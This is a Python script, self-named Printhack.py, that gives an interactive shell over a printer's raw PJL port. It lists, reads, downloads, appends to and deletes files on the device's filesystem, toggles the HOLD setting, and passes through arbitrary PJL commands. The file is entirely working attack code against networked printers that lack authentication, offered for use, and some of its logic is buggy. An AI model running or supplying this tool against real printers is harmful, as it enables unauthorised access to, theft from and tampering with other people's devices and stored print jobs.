import socket
import sys
import re

def init(ip, port):
	sock = socket.socket(socket.AF_INET)
	sock.settimeout(2.0)
	server_address = (ip, port)
	info = sock.connect(server_address)
	print(server_address[0]+":"+str(server_address[1])+" Connect")
	return sock

def file_size(sock, filename):
	query = '@PJL FSQUERY NAME="0:/'+filename+'"\n'
	sock.send(query.encode());
	tmp = sock.recv(1024).decode()
	size = re.findall("TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d*)", tmp)
	return size[0]

def get_hold(sock):
	query = '@PJL INFO VARIABLES\n'
	while(True):
		sock.send(query.encode())
		str = sock.recv(1024*1024*1024).decode()
		index = str.find("HOLD=")
		if(index!=-1):
			str = str[index:index+15]
			return re.findall("HOLD=[A-Z]*", str)[0][5:]

def flush(sock):
	try:
		while(True):
			sock.recv(1024)
	except:
		pass	

def recvall(sock, bufsize):
	data = b''
	while(len(data)<bufsize):
		try:
			part = sock.recv(bufsize-len(data))
			data += part
		except:
			break
	return data

def comuni(sock, query, mod ,bufsize):
	query = query+"\r\n"
	sock.send(query.encode())
	try:
		print(sock.recv(1024).decode())
	except:
		pass
	if(mod==1): data = recvall(sock, bufsize)
	else:
		try:
			data = sock.recv(bufsize)[:-1]
		except Exception as e:
			data ="".encode()

	return data

def command(sock, cmd):
	cmd = cmd.split()
	mod = 0
	file_down = 0
	not_print = 0
	bufsize = 1024 # recvall Default size

	if(len(cmd)!=1):
		argv = cmd[1:]
		cmd = cmd[0]
	else:
		argv=""
		cmd = cmd[0]

	if(cmd=="ls"):
		query = '@PJL FSDIRLIST NAME="0:/'+' '.join(argv)+'" ENTRY=1'
		print(query)
	elif(cmd=="append"):
		if(argv[0]=="-f"):
			argv.pop(0)
			filename = argv[0]
			f = open(filename, 'r')
			txt_data = f.read()
			f.close()
		else:
			txt_data = ' '.join(argv[1:])	
		mod = 1
		query = '@PJL FSAPPEND FORMAT:BINARY NAME="0:/'+argv[0]+'" size='+str(len(txt_data))+'\r\n'
		query += txt_data+'<ESC>%-12345x'
	elif(cmd=="read" or cmd=="down"):
		if(cmd=="down"): file_down = 1
		mod = 1
		bufsize = file_size(sock, argv[0])
		query = '@PJL FSUPLOAD NAME="0:/'+' '.join(argv)+'" OFFSET=0 Size='+bufsize
	elif(cmd=="delete"):
		query = '@PJL FSDELETE NAME="0:/'+' '.join(argv)+'"'
	elif(cmd=="hold"):
		not_print=1
		status = get_hold(sock)
		print("HOLD="+status+" -> ON")
		flush(sock)
		return ""
		if(status=="ON"): return ""
		query = "@PJL SET HOLD=ON"
	
	else:
		query = cmd+' '+' '.join(argv)

	data = comuni(sock, query, mod, int(bufsize))

	if(file_down==1):
		file = ' '.join(argv)
		f = open(file,"wb")
		f.write(data)
		f.close()
	elif(not_print==0):
		print(data.decode())

if len(sys.argv) != 3:
    print("please Enter argument. ex: pyton Printhack.py ip port")
    sys.exit()
else:
	ip = sys.argv[1]
	port = sys.argv[2]

sock = init(ip, int(port))
while(True):
	cmd = input(">")
	if(cmd=="q"): break
	command(sock, cmd)
sock.close()
